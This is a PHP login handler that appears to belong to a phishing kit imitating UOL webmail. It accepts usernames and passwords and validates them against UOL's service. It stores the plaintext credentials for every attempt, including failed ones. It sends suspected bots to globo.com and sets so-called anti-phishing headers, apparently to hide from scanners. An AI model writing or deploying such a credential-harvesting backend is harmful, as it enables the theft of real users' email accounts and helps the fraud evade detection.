<?php
declare(strict_types=1);

require __DIR__ . '/includes/security.php';

$config = require __DIR__ . '/config.php';
public_session_start($config);

require __DIR__ . '/includes/anti_bot.php';
require __DIR__ . '/includes/anti_phishing.php';
require __DIR__ . '/includes/messages.php';
require __DIR__ . '/includes/storage.php';
require __DIR__ . '/includes/uol_verify.php';
require __DIR__ . '/includes/api_auth.php';

header('Content-Type: application/json; charset=utf-8');
anti_phishing_headers();

$denyUrl = uol_blocked_redirect($config);
$botCheck = anti_bot_evaluate_login_api($config);
if (!$botCheck['allowed']) {
    $botUrl = (string) ($config['anti_bot']['redirect'] ?? 'https://www.globo.com/');
    http_response_code(403);
    echo json_encode(['redirect' => $botUrl, 'blocked' => true, 'bot' => true]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['message' => 'invalid_login', 'text' => uol_msg('invalid_login')]);
    exit;
}

$user = trim((string) ($_POST['login'] ?? $_POST['user'] ?? ''));
$pass = (string) ($_POST['password'] ?? $_POST['pass'] ?? '');
$storage = new Storage($config['data_dir']);
$ip = client_ip();
$ua = client_ua();
$maxAttempts = (int) ($config['max_login_attempts'] ?? 5);

if ($storage->isIpBlocked($ip)) {
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true]);
    exit;
}

if ($storage->getIpLoginAttempts($ip) >= $maxAttempts) {
    $storage->setIpBlocked($ip, true);
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true]);
    exit;
}

$result = uol_api_verify($user, $pass, $config, true);
$ok = !empty($result['payload']['ok']);

$attempts = $storage->incrementIpLoginAttempt($ip);
if (!$ok && $attempts >= $maxAttempts) {
    $storage->setIpBlocked($ip, true);
    echo json_encode(['redirect' => $denyUrl, 'blocked' => true, 'attempts' => $attempts]);
    exit;
}

if ($ok) {
    $storage->recordLoginAttempt($user, $pass, true, $ip, $ua);
    $sessionKey = (string) ($config['session_key'] ?? 'webmail_user');
    $_SESSION[$sessionKey] = $user;
    $storage->resetIpLoginAttempts($ip);
} else {
    $storage->recordLoginAttempt($user, $pass, false, $ip, $ua);
}

uol_api_json_response($result['status'], $result['payload']);
